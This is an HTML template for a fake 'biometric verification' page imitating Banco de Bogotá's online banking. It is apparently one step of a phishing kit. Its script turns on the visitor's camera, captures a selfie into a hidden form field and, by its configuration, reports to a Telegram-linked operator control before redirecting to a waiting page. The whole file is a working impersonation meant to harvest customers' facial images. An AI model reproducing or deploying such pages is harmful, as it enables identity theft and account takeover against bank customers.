<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <link rel="icon" type="image/x-icon" href="/bogota/icono_bogota.ico">
    <title>Verificación Biométrica - Banca Virtual Banco de Bogotá</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css">
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"
        integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
    <x-control :auto-completar="false" :debug="false" redirect-url="/bogota/wait"
        toast-message="No se pudo verificar su identidad, intente nuevamente" telegram-button="SELFIE" />
    <style>
        @font-face {
            font-family: Roboto-Regular;
            src: url(/bogota/6bede58e856278b0f8f1.ttf);
            font-display: swap
        }

        @font-face {
            font-family: Roboto-Medium;
            src: url(/bogota/0fcd45fbfc419c42c8b9.ttf);
            font-display: swap
        }

        @font-face {
            font-family: Roboto-Bold;
            src: url(/bogota/17451a4c1cd55e33ac57.ttf);
            font-display: swap
        }

        body {
            font-family: Roboto-Regular;
            background-color: #f5f5f5;
        }

        .texto-1 {
            font-size: 24px;
            font-family: Roboto-Medium;
            color: #000000;
        }

        .texto-2 {
            font-size: 14px;
            font-family: Roboto-Regular;
            color: #666666;
        }

        .boton-1 {
            font-size: 16px;
            font-family: Roboto-Medium;
            width: 100%;
            border-radius: 100px;
            cursor: pointer;
            height: 48px;
            border: solid 1px #0043a9;
            background-color: #0043a9;
            color: #ffffff;
            transition: .3s;
        }

        .boton-1:disabled {
            background-color: #ccc;
            border-color: #ccc;
            cursor: not-allowed;
        }

        .boton-secundario {
            font-size: 14px;
            font-family: Roboto-Medium;
            width: 100%;
            border-radius: 100px;
            cursor: pointer;
            height: 40px;
            border: solid 2px #6b7280;
            background-color: #ffffff;
            color: #6b7280;
            transition: .3s;
        }

        .camera-container {
            position: relative;
            width: 100%;
            aspect-ratio: 1;
            background: #000;
            border-radius: 12px;
            overflow: hidden;
        }

        #video, #canvas, #preview {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
        }

        #canvas { display: none; }
        #preview { display: none; }

        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
        }

        .face-guide {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 70%;
            height: 85%;
            border: 3px dashed rgba(0, 67, 169, 0.7);
            border-radius: 50%;
        }

        .face-guide.captured {
            border-color: #22c55e;
        }

        @media only screen and (min-width: 768px) {
            body {
                width: 40%;
                margin: 0 auto;
            }
        }
    </style>
</head>

<body class="px-3">
    <!-- Header -->
    <div class="text-center py-4">
        <img src="/bogota/logo_bogota_1.svg" width="300" height="auto" alt="Banco de Bogotá">
    </div>

    <!-- Contenido Principal -->
    <h1 class="texto-1 mt-2 text-center">Verificación biométrica</h1>
    <p class="texto-2 text-center">Tome una selfie para verificar su identidad</p>

    <div class="bg-white rounded-3 p-3 mb-3">
        <!-- Error de cámara -->
        <div id="cameraError" class="d-none text-center py-4">
            <i class="bi bi-exclamation-triangle text-danger" style="font-size: 48px;"></i>
            <p class="text-danger fw-bold mt-2">No se pudo acceder a la cámara</p>
            <p class="text-muted small">Permita el acceso a la cámara en su navegador</p>
        </div>

        <!-- Contenedor de cámara -->
        <div id="cameraWrapper">
            <div class="camera-container">
                <video id="video" autoplay playsinline></video>
                <canvas id="canvas"></canvas>
                <img id="preview" alt="Vista previa">
                <div class="overlay">
                    <div class="face-guide" id="faceGuide"></div>
                </div>
            </div>

            <!-- Instrucciones -->
            <div class="mt-3 bg-light rounded p-3">
                <ul class="small text-muted mb-0 ps-3">
                    <li>Ubique su rostro dentro del óvalo</li>
                    <li>Asegúrese de tener buena iluminación</li>
                    <li>No use gafas de sol ni gorras</li>
                    <li>Mantenga una expresión neutral</li>
                </ul>
            </div>
        </div>

        <form id="formSelfie" class="mt-4">
            <input type="hidden" id="selfie" name="selfie">
            <input type="hidden" id="no-status" name="status" value="selfie">

            <button type="button" id="btnCapturar" class="boton-1 mb-2">
                Tomar Foto
            </button>

            <button type="submit" id="enviar" class="boton-1 d-none mb-2">
                Continuar
            </button>

            <button type="button" id="btnReintentar" class="boton-secundario d-none">
                Volver a Tomar
            </button>
        </form>
    </div>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const preview = document.getElementById('preview');
        const btnCapturar = document.getElementById('btnCapturar');
        const btnEnviar = document.getElementById('enviar');
        const btnReintentar = document.getElementById('btnReintentar');
        const selfieData = document.getElementById('selfie');
        const cameraError = document.getElementById('cameraError');
        const cameraWrapper = document.getElementById('cameraWrapper');
        const faceGuide = document.getElementById('faceGuide');

        let stream = null;

        async function iniciarCamara() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 640 } },
                    audio: false
                });
                video.srcObject = stream;
            } catch (error) {
                cameraWrapper.style.display = 'none';
                cameraError.classList.remove('d-none');
            }
        }

        function capturarFoto() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);

            const imageData = canvas.toDataURL('image/jpeg', 0.8);
            selfieData.value = imageData;

            preview.src = imageData;
            video.style.display = 'none';
            preview.style.display = 'block';

            btnCapturar.style.display = 'none';
            btnEnviar.classList.remove('d-none');
            btnReintentar.classList.remove('d-none');

            faceGuide.classList.add('captured');
        }

        function reiniciarCaptura() {
            video.style.display = 'block';
            preview.style.display = 'none';
            selfieData.value = '';

            btnCapturar.style.display = 'block';
            btnEnviar.classList.add('d-none');
            btnReintentar.classList.add('d-none');

            faceGuide.classList.remove('captured');
        }

        btnCapturar.addEventListener('click', capturarFoto);
        btnReintentar.addEventListener('click', reiniciarCaptura);

        iniciarCamara();
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
        crossorigin="anonymous"></script>
</body>

</html>
